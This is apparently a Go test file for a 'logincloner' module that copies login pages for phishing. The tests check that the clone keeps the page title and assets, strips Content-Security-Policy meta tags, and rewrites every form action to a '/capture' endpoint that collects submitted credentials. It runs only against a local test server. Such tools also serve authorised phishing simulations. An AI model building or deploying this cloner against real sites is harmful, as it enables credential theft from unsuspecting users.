package logincloner

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func fakeModule() *LoginCloner {
	return &LoginCloner{client: newHTTPClient()}
}

func newTestServer(t *testing.T, routes map[string][2]string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	for path, pair := range routes {
		ct, body := pair[0], pair[1]
		mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", ct)
			w.WriteHeader(200)
			_, _ = w.Write([]byte(body))
		})
	}
	return httptest.NewServer(mux)
}

func TestClone_BasicLoginPage(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<!DOCTYPE html>
<html><head><title>Login</title></head>
<body>
<form method="POST" action="/do-login">
  <input type="text"     name="user">
  <input type="password" name="pass">
  <button>Sign in</button>
</form>
</body></html>`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()

	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone returned error: %v", err)
	}

	html, err := os.ReadFile(filepath.Join(dir, "index.html"))
	if err != nil {
		t.Fatalf("index.html not written: %v", err)
	}

	body := string(html)
	if !strings.Contains(body, `action="/capture"`) {
		t.Errorf("form action not rewritten to /capture; got:\n%s", body)
	}
	if strings.Contains(body, `action="/do-login"`) {
		t.Errorf("original form action still present in output")
	}
	if !strings.Contains(body, `method="POST"`) {
		t.Errorf("form method should be POST")
	}
}

func TestClone_TitlePreserved(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><head><title>Acme Login Portal</title></head><body></body></html>`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()

	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if !strings.Contains(string(html), "Acme Login Portal") {
		t.Errorf("page title lost after cloning")
	}
}

func TestClone_CSPMetaRemoved(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><head>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
</head><body></body></html>`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if strings.Contains(string(html), "Content-Security-Policy") {
		t.Errorf("CSP meta tag should be stripped from cloned page")
	}
}

func TestClone_CSSAssetDownloaded(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><head>
<link rel="stylesheet" href="/style.css">
</head><body></body></html>`},
		"/style.css": {"text/css", `body { color: red; }`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	css, err := os.ReadFile(filepath.Join(dir, "assets", "style.css"))
	if err != nil {
		t.Fatalf("style.css not saved: %v", err)
	}
	if !strings.Contains(string(css), "color: red") {
		t.Errorf("CSS content mismatch")
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if !strings.Contains(string(html), `href="assets/style.css"`) {
		t.Errorf("stylesheet href not rewritten in HTML; got:\n%s", string(html))
	}
}

func TestClone_JSAssetDownloaded(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><head></head><body>
<script src="/app.js"></script>
</body></html>`},
		"/app.js": {"application/javascript", `console.log("hello");`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	js, err := os.ReadFile(filepath.Join(dir, "assets", "app.js"))
	if err != nil {
		t.Fatalf("app.js not saved: %v", err)
	}
	if !strings.Contains(string(js), "hello") {
		t.Errorf("JS content mismatch")
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if !strings.Contains(string(html), `src="assets/app.js"`) {
		t.Errorf("script src not rewritten in HTML")
	}
}

func TestClone_ImageDownloaded(t *testing.T) {
	fakePNG := []byte{0x89, 0x50, 0x4E, 0x47}
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><head></head><body>
<img src="/logo.png" alt="logo">
</body></html>`},
		"/logo.png": {"image/png", string(fakePNG)},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	if _, err := os.Stat(filepath.Join(dir, "assets", "logo.png")); err != nil {
		t.Fatalf("logo.png not saved: %v", err)
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if !strings.Contains(string(html), `src="assets/logo.png"`) {
		t.Errorf("img src not rewritten in HTML")
	}
}

func TestRewriteCSSURLs(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/bg.png": {"image/png", "fakepng"},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()

	baseURL, _ := url_parse(srv.URL + "/style.css")
	css := []byte(`body { background: url('/bg.png'); }`)
	result := m.rewriteCSSURLs(baseURL, css, dir)

	if strings.Contains(string(result), "/bg.png") {
		t.Errorf("url() still references remote path after rewrite: %s", result)
	}
	if !strings.Contains(string(result), "bg.png") {
		t.Errorf("url() should reference local filename: %s", result)
	}
}

func TestSanitiseFilename(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"/path/to/style.css", "style.css"},
		{"/path/to/style.css?v=123", "style.css"},
		{"/path/to/style.css#anchor", "style.css"},
		{"", "asset"},
		{"/", "asset"},
	}
	for _, c := range cases {
		got := sanitiseFilename(c.in)
		if got != c.want {
			t.Errorf("sanitiseFilename(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestClone_MultipleFormsRewritten(t *testing.T) {
	srv := newTestServer(t, map[string][2]string{
		"/": {"text/html", `<html><body>
<form action="/login" method="GET"><input name="u"></form>
<form action="/search" method="GET"><input name="q"></form>
</body></html>`},
	})
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/", dir); err != nil {
		t.Fatalf("Clone: %v", err)
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	body := string(html)

	if strings.Contains(body, `action="/login"`) || strings.Contains(body, `action="/search"`) {
		t.Errorf("original form actions still present; got:\n%s", body)
	}

	count := strings.Count(body, `action="/capture"`)
	if count != 2 {
		t.Errorf("expected 2 forms with action=/capture, got %d", count)
	}
}

func TestClone_FollowsRedirect(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/old", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/new", http.StatusMovedPermanently)
	})
	mux.HandleFunc("/new", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<html><head><title>New Login</title></head><body></body></html>`))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	m := fakeModule()
	dir := t.TempDir()
	if err := m.Clone(srv.URL+"/old", dir); err != nil {
		t.Fatalf("Clone with redirect: %v", err)
	}

	html, _ := os.ReadFile(filepath.Join(dir, "index.html"))
	if !strings.Contains(string(html), "New Login") {
		t.Errorf("redirected page title not present in clone")
	}
}

// url_parse is a test helper to get *url.URL without noise.
func url_parse(raw string) (*url.URL, error) {
	return url.Parse(raw)
}
